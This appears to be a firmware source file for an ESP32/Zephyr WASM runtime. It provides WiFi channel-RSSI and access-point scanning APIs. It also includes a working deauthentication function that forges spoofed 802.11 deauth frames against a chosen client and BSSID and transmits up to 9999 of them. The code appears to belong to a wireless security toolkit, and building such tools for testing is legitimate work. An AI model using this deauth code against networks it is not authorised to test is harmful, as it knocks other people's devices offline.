/**
 * @file akira_wifi_api.c
 * @brief WiFi scan and deauth WASM-native API — compiled whenever CONFIG_WIFI=y
 */

#include "akira_api.h"
#include "akira_rf_api.h"
#include <runtime/security.h>
#include <zephyr/logging/log.h>

#ifdef CONFIG_WIFI
#include <zephyr/net/net_if.h>
#include <zephyr/net/net_mgmt.h>
#include <zephyr/net/wifi_mgmt.h>
#if defined(CONFIG_SOC_SERIES_ESP32S3) || defined(CONFIG_SOC_SERIES_ESP32)
#include <esp_wifi.h>
#endif
#endif

#include "connectivity/radio_interface.h"
#include <string.h>

LOG_MODULE_REGISTER(akira_wifi_api, CONFIG_AKIRA_LOG_LEVEL);

#ifdef CONFIG_WIFI

/* ── Spectrum scan (per-channel max RSSI) ────────────────────────────── */
#define WIFI_SCAN_MAX_CHANNELS 14
#define WIFI_SCAN_TIMEOUT_MS   5000

struct wifi_scan_ctx {
    int8_t  rssi[WIFI_SCAN_MAX_CHANNELS];
    uint8_t seen[WIFI_SCAN_MAX_CHANNELS];
    struct k_sem done;
};

static struct wifi_scan_ctx g_wifi_scan_ctx;
static struct net_mgmt_event_callback g_wifi_scan_cb;
static bool g_wifi_scan_cb_reg;

static void wifi_scan_event_handler(struct net_mgmt_event_callback *cb,
                                     uint64_t event, struct net_if *iface)
{
    ARG_UNUSED(cb);
    ARG_UNUSED(iface);

    if (event == NET_EVENT_WIFI_SCAN_RESULT) {
        const struct wifi_scan_result *entry =
            (const struct wifi_scan_result *)cb->info;
        if (entry && entry->channel >= 1 &&
            entry->channel <= WIFI_SCAN_MAX_CHANNELS) {
            int ch = entry->channel - 1;
            if (!g_wifi_scan_ctx.seen[ch] ||
                entry->rssi > g_wifi_scan_ctx.rssi[ch]) {
                g_wifi_scan_ctx.rssi[ch] = entry->rssi;
                g_wifi_scan_ctx.seen[ch] = 1;
            }
        }
    } else if (event == NET_EVENT_WIFI_SCAN_DONE) {
        k_sem_give(&g_wifi_scan_ctx.done);
    }
}

int akira_native_wifi_scan_rssi(wasm_exec_env_t exec_env,
                                 uint32_t buf_ptr, uint32_t buf_len)
{
    wasm_module_inst_t module_inst = wasm_runtime_get_module_inst(exec_env);
    if (!module_inst) {
        return -1;
    }

    AKIRA_CHECK_CAP_OR_RETURN(exec_env, AKIRA_CAP_RF_TRANSCEIVE, -EPERM);

    if (buf_len < WIFI_SCAN_MAX_CHANNELS) {
        return -EINVAL;
    }

    int8_t *dst = (int8_t *)wasm_runtime_addr_app_to_native(module_inst, buf_ptr);
    if (!dst) {
        return -EFAULT;
    }

    struct net_if *iface = net_if_get_default();
    if (!iface) {
        LOG_ERR("wifi_scan_rssi: no default interface");
        return -ENODEV;
    }

    (void)memset(g_wifi_scan_ctx.rssi, RADIO_RSSI_UNAVAILABLE,
                 sizeof(g_wifi_scan_ctx.rssi));
    (void)memset(g_wifi_scan_ctx.seen, 0, sizeof(g_wifi_scan_ctx.seen));
    k_sem_init(&g_wifi_scan_ctx.done, 0, 1);

    if (!g_wifi_scan_cb_reg) {
        net_mgmt_init_event_callback(&g_wifi_scan_cb,
                                     wifi_scan_event_handler,
                                     NET_EVENT_WIFI_SCAN_RESULT |
                                     NET_EVENT_WIFI_SCAN_DONE);
        net_mgmt_add_event_callback(&g_wifi_scan_cb);
        g_wifi_scan_cb_reg = true;
    }

    LOG_INF("Starting WiFi scan for spectrum analysis");

    int ret = net_mgmt(NET_REQUEST_WIFI_SCAN, iface, NULL, 0);
    if (ret) {
        LOG_ERR("WiFi scan request failed: %d", ret);
        return ret;
    }

    ret = k_sem_take(&g_wifi_scan_ctx.done, K_MSEC(WIFI_SCAN_TIMEOUT_MS));
    if (ret) {
        LOG_WRN("WiFi scan timed out, returning partial results");
    }

    for (int i = 0; i < WIFI_SCAN_MAX_CHANNELS; i++) {
        dst[i] = g_wifi_scan_ctx.rssi[i];
    }

    return WIFI_SCAN_MAX_CHANNELS;
}

/* ── AP scan (full wifi_scan_result records) ─────────────────────────── */

#define WIFI_APS_MAX          64
#define WIFI_AP_ENTRY_SIZE    48    /* sizeof(akira_wifi_ap_t) — must match SDK */
#define WIFI_APS_TIMEOUT_MS   8000

struct wifi_ap_wire {
    uint8_t  ssid[33];      /* +0  null-terminated SSID */
    uint8_t  bssid[6];      /* +33 BSSID (MAC) */
    uint8_t  channel;       /* +39 2.4 GHz channel 1-14 */
    int8_t   rssi;          /* +40 signal strength dBm */
    uint8_t  security;      /* +41 0=open 1=WEP 2=WPA 3=WPA2 4=WPA3 5=ENT */
    uint8_t  _pad[2];       /* +42 align last_seen_ms to 4-byte boundary */
    uint32_t last_seen_ms;  /* +44 k_uptime_get_32() when last seen */
};                          /* total 48 */
BUILD_ASSERT(sizeof(struct wifi_ap_wire) == WIFI_AP_ENTRY_SIZE,
             "wifi_ap_wire / akira_wifi_ap_t size mismatch");

/* Place the large AP buffer in external RAM on PSRAM-equipped boards */
#if defined(CONFIG_SPIRAM)
static struct wifi_ap_wire g_aps_buf[WIFI_APS_MAX] __attribute__((section(".ext_ram.bss")));
#else
static struct wifi_ap_wire g_aps_buf[WIFI_APS_MAX];
#endif
static int                              g_aps_count;
static struct k_sem                     g_aps_sem;
static struct net_mgmt_event_callback   g_aps_cb;
static bool                             g_aps_cb_reg;

static uint8_t ap_map_security(enum wifi_security_type s)
{
    switch (s) {
    case WIFI_SECURITY_TYPE_NONE:            return 0;
    case WIFI_SECURITY_TYPE_WEP:             return 1;
    case WIFI_SECURITY_TYPE_WPA_PSK:         return 2;
    case WIFI_SECURITY_TYPE_PSK:
    case WIFI_SECURITY_TYPE_PSK_SHA256:
    case WIFI_SECURITY_TYPE_WPA_AUTO_PERSONAL:
    case WIFI_SECURITY_TYPE_FT_PSK:          return 3; /* WPA2 */
    case WIFI_SECURITY_TYPE_SAE:
    case WIFI_SECURITY_TYPE_SAE_H2E:
    case WIFI_SECURITY_TYPE_SAE_AUTO:
    case WIFI_SECURITY_TYPE_FT_SAE:
    case WIFI_SECURITY_TYPE_SAE_EXT_KEY:     return 4; /* WPA3 */
    default:                                 return 5; /* Enterprise / unknown */
    }
}

static void wifi_aps_event_handler(struct net_mgmt_event_callback *cb,
                                    uint64_t event, struct net_if *iface)
{
    ARG_UNUSED(iface);

    if (event == NET_EVENT_WIFI_SCAN_RESULT) {
        if (g_aps_count >= WIFI_APS_MAX) return;
        const struct wifi_scan_result *e =
            (const struct wifi_scan_result *)cb->info;
        if (!e) return;

        for (int i = 0; i < g_aps_count; i++) {
            if (memcmp(g_aps_buf[i].bssid, e->mac, 6) == 0) {
                if (e->rssi > g_aps_buf[i].rssi)
                    g_aps_buf[i].rssi = e->rssi;
                g_aps_buf[i].last_seen_ms = k_uptime_get_32();
                return;
            }
        }

        struct wifi_ap_wire *ap = &g_aps_buf[g_aps_count++];
        uint8_t slen = e->ssid_length < 32u ? e->ssid_length : 32u;
        memcpy(ap->ssid, e->ssid, slen);
        ap->ssid[slen]   = '\0';
        memcpy(ap->bssid, e->mac, 6);
        ap->channel      = e->channel;
        ap->rssi         = e->rssi;
        ap->security     = ap_map_security(e->security);
        ap->_pad[0]      = 0;
        ap->_pad[1]      = 0;
        ap->last_seen_ms = k_uptime_get_32();

    } else if (event == NET_EVENT_WIFI_SCAN_DONE) {
        k_sem_give(&g_aps_sem);
    }
}

int akira_native_wifi_scan_aps(wasm_exec_env_t exec_env,
                                void *buf, uint32_t buf_len)
{
    AKIRA_CHECK_CAP_OR_RETURN(exec_env, AKIRA_CAP_RF_TRANSCEIVE, -EPERM);

    if (!buf || buf_len < WIFI_AP_ENTRY_SIZE) return -EINVAL;

    struct net_if *iface = net_if_get_default();
    if (!iface) {
        LOG_ERR("wifi_scan_aps: no default interface");
        return -ENODEV;
    }

    uint32_t max_aps = buf_len / WIFI_AP_ENTRY_SIZE;
    if (max_aps > WIFI_APS_MAX) max_aps = WIFI_APS_MAX;

    memset(g_aps_buf, 0, sizeof(g_aps_buf));
    g_aps_count = 0;
    k_sem_init(&g_aps_sem, 0, 1);

    if (!g_aps_cb_reg) {
        net_mgmt_init_event_callback(&g_aps_cb, wifi_aps_event_handler,
                                     NET_EVENT_WIFI_SCAN_RESULT |
                                     NET_EVENT_WIFI_SCAN_DONE);
        net_mgmt_add_event_callback(&g_aps_cb);
        g_aps_cb_reg = true;
    }

    LOG_INF("wifi_scan_aps: starting passive scan");
    int ret = net_mgmt(NET_REQUEST_WIFI_SCAN, iface, NULL, 0);
    if (ret) {
        LOG_ERR("wifi_scan_aps: scan request failed: %d", ret);
        return ret;
    }

    ret = k_sem_take(&g_aps_sem, K_MSEC(WIFI_APS_TIMEOUT_MS));
    if (ret) LOG_WRN("wifi_scan_aps: timeout, returning %d partial results",
                     g_aps_count);

    uint32_t n = (uint32_t)g_aps_count < max_aps
                 ? (uint32_t)g_aps_count : max_aps;
    memcpy(buf, g_aps_buf, n * WIFI_AP_ENTRY_SIZE);

    LOG_INF("wifi_scan_aps: done — %d APs", g_aps_count);
    return (int)n;
}

#endif /* CONFIG_WIFI */

#if defined(CONFIG_WIFI) && (defined(CONFIG_SOC_SERIES_ESP32S3) || defined(CONFIG_SOC_SERIES_ESP32))

#define WASM_ADDR_CHECK(inst, ptr, len)                                 \
    do {                                                                 \
        if (!(ptr) || !wasm_runtime_validate_native_addr((inst),        \
                                                          (ptr), (len)))\
        { return -EFAULT; }                                              \
    } while (0)

struct __attribute__((packed)) deauth_frame {
    uint8_t  fc[2];
    uint8_t  dur[2];
    uint8_t  da[6];
    uint8_t  sa[6];
    uint8_t  bssid[6];
    uint8_t  seq[2];
    uint8_t  reason[2];
};
BUILD_ASSERT(sizeof(struct deauth_frame) == 26, "deauth_frame must be 26 bytes");

#define DEAUTH_MAX_COUNT       9999
#define DEAUTH_MIN_INTERVAL_MS   10

int akira_native_wifi_deauth(wasm_exec_env_t exec_env,
                              void *bssid_ptr, void *client_ptr,
                              int32_t channel, int32_t count, int32_t interval_ms)
{
    AKIRA_CHECK_CAP_OR_RETURN(exec_env, AKIRA_CAP_WIFI_INJECT, -EPERM);

    if (!bssid_ptr || !client_ptr)               return -EINVAL;
    if (channel < 1 || channel > 14)             return -EINVAL;
    if (count   < 1 || count > DEAUTH_MAX_COUNT) return -EINVAL;
    if (interval_ms < DEAUTH_MIN_INTERVAL_MS) interval_ms = DEAUTH_MIN_INTERVAL_MS;

    wasm_module_inst_t inst = wasm_runtime_get_module_inst(exec_env);
    WASM_ADDR_CHECK(inst, bssid_ptr,  6);
    WASM_ADDR_CHECK(inst, client_ptr, 6);

    const uint8_t *bssid  = (const uint8_t *)bssid_ptr;
    const uint8_t *client = (const uint8_t *)client_ptr;

    esp_wifi_set_channel((uint8_t)channel, WIFI_SECOND_CHAN_NONE);

    struct deauth_frame frame;
    frame.fc[0]     = 0xC0; frame.fc[1]     = 0x00;
    frame.dur[0]    = 0x3A; frame.dur[1]    = 0x01;
    frame.reason[0] = 0x07; frame.reason[1] = 0x00;
    memcpy(frame.da,    client, 6);
    memcpy(frame.sa,    bssid,  6);
    memcpy(frame.bssid, bssid,  6);

    int sent = 0;
    for (int32_t i = 0; i < count; i++) {
        uint16_t seq = (uint16_t)(i << 4);
        frame.seq[0] = (uint8_t)(seq & 0xFF);
        frame.seq[1] = (uint8_t)(seq >> 8);

        esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, &frame, sizeof(frame), true);
        if (err == ESP_OK) sent++;

        if (i < count - 1) k_msleep(interval_ms);
    }

    LOG_INF("wifi_deauth: channel=%d count=%d sent=%d", channel, count, sent);
    return sent;
}

#endif /* CONFIG_WIFI && ESP32S3/ESP32 */
